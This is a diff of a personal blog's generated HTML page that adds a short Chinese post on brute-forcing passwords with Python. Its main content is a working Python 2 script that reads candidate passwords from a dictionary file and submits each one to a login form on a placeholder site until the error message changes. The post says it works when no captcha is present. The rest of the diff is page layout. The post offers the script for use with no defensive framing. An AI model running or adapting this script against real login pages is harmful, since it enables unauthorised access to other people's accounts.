@@ -1,7 +1,5 @@
 
 
-  
-
 
 
 
@@ -18,9 +16,14 @@
   
   
   
-    <meta name="description" content="always be shiny!">
+    <meta name="description" content="title: python进行暴力破解date: 2017-03-05 10:58:52
+tags:根据字典文件,使用python进行暴力破解,程序很简单注：针对没有验证码的情况实例代码
+#encoding=utf-8
+import httplib,urllib
+conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)
+f=open(&quo...">
   
-  <title>归档 [ shiny-boy ]</title>
+  <title>阳光男孩 [ shiny-boy ]</title>
   
     <link rel="alternate" href="/atom.xml" title="shiny-boy">
   
@@ -41,6 +44,15 @@
 <body>
 <div class="side-navigate hide-area">
   
+  
+    <div class="item next">
+      <a href="/2017/03/05/利用hexo与nodejs搭建博客/">
+        <div class="item-icon"></div>
+      </a>
+      <div class="item-title">
+        利用hexo与nodejs搭建博客
+      </div>
+    </div>
   
 </div>
 <div id="outer-container" class="hide-area">
@@ -66,7 +78,7 @@
           </li>
         
           
-            <li class="active">
+            <li>
           
             <a href="/archives">Archives</a>
             
@@ -112,149 +124,63 @@
     <div id="content-inner">
       
       
-  <article>
+  <article id="post">
+    <h1>空标题</h1>
+    <p class="page-title-sub">
+      <span id = "post-title-date">撰写于 2017-03-06</span>
+      
+        <span id = "post-title-updated">修改于 2017-03-06</span>
+      
+      
+      
+    </p>
     
-
-  <div id="recent-posts">
-    <h1>归档
-    
-      <span class="posts-count">
-      共
-      4
-      
-        文章
-      
-      </span>
-    
-    </h1>
-    
-    
-      
-      
-        
-      
-      
-    
-      
-      
-      
-    
-      
-      
-      
-    
-      
-      
-      
-    
-    
-    
-      
-      
-        
-        <h3 class="archive-year-title">2017
-        
-          <span class="posts-count">
-          共
-          4
-          
-            文章
-          
-          </span>
-        
-        </h3>
-      
-      <div class="post-title-item">
-  
-  <a href="/2017/03/06/python进行暴力破解密码/">
-  
-    title: python进行暴力破解date: 2017-03-05 10:58:52
-tags:根据字典文件,使用python进行暴力破解,程序很简单...
-  
-  </a>
-  <p class="page-title-sub">
-    <span id = "post-title-date">3-6</span>
-    
-    
-    
-      <br>
-      
-      
-    
-  </p>
-  
-</div>
-    
-      
-      
-      <div class="post-title-item">
-  
-  <a href="/2017/03/05/利用hexo与nodejs搭建博客/">
-  
-    利用hexo与nodejs搭建博客
-  
-  </a>
-  <p class="page-title-sub">
-    <span id = "post-title-date">3-5</span>
-    
-    
-    
-      <br>
-      
-      
-    
-  </p>
-  
-</div>
-    
-      
-      
-      <div class="post-title-item">
-  
-  <a href="/2017/03/05/never-give-up/">
-  
-    never give up
-  
-  </a>
-  <p class="page-title-sub">
-    <span id = "post-title-date">3-5</span>
-    
-    
-    
-      <br>
-      
-      
-    
-  </p>
-  
-</div>
-    
-      
-      
-      <div class="post-title-item">
-  
-  <a href="/2017/03/05/初识hexo命令/">
-  
-    初识hexo命令
-  
-  </a>
-  <p class="page-title-sub">
-    <span id = "post-title-date">3-5</span>
-    
-    
-    
-      <br>
-      
-      
-    
-  </p>
-  
-</div>
-    
-  </div>
-
-
+    <hr>
+<p>title: python进行暴力破解<br>date: 2017-03-05 10:58:52</p>
+<h2 id="tags"><a href="#tags" class="headerlink" title="tags:"></a>tags:</h2><p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码</p>
+<pre><code>#encoding=utf-8
+import httplib,urllib
+conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)
+f=open(&quot;dict.txt&quot;)
+while 1:
+    pwd=f.readline().strip()
+    if not pwd:
+        print &apos;字典已比对完。&apos;
+        break
+    params = urllib.urlencode({&apos;username&apos;: &apos;xxx&apos;, &apos;mod&apos;: &apos;&apos;, &apos;password&apos;: pwd})
+    headers = {&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;}
+    conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers)
+    r = conn.getresponse()
+    print r.status, r.reason
+    data1 = r.read().decode(&apos;gbk&apos;)#编码根据实际情况酌情处理
+    print data1.index(u&apos;您输入的密码有误&apos;),&apos;您输入的密码\&apos;%s\&apos;有误&apos;%pwd
+conn.close()
+</code></pre>
   </article>
+  <div class="random-toc-area">
+  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">显示目录</button>
+  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">隐藏目录</button>
+  <div class="random-toc">
+    <h2>目录</h2>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#tags"><span class="toc-text">tags:</span></a></li></ol>
+  </div>
+</div>
+
+  
+<nav id="pagination">
+  
+
+  
+
+  
+    <a href="/2017/03/05/利用hexo与nodejs搭建博客/" class="next">下一篇 利用hexo与nodejs搭建博客 &rarr;</a>
+  
+</nav>
+
+  <!-- JiaThis Button BEGIN -->
+
+<!-- JiaThis Button END -->
+
 
       
       
@@ -366,6 +292,8 @@ var unsplashConfig = {"gravity":"north"};
 var turnoffBackgroundImage = false;
 
 
+
+  turnoffBackgroundImage = true;
 
 
 var backgroundColor = "34495E";
